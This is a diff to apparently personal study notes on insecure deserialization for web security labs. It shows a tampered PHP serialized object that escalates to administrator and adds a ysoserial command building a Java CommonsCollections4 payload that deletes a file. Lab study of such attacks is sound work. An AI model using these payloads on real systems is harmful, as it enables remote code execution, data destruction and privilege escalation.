@@ -14,6 +14,9 @@ A basic privilege escalation:
 Change to:
 `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
 
+With ysoserial remember to url encode your generated payload
+`java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64`
+
 Objects are serialized as:  
 `O:<i>:"<s>":<i>:{<properties>}`  
 where the first `<i>` is an integer representing the string length of `<s>`, and `<s>` is the fully qualified class name (class name prepended with full namespace). The second `<i>` is an integer representing the number of object properties. `<properties>` are zero or more serialized name value pairs:  
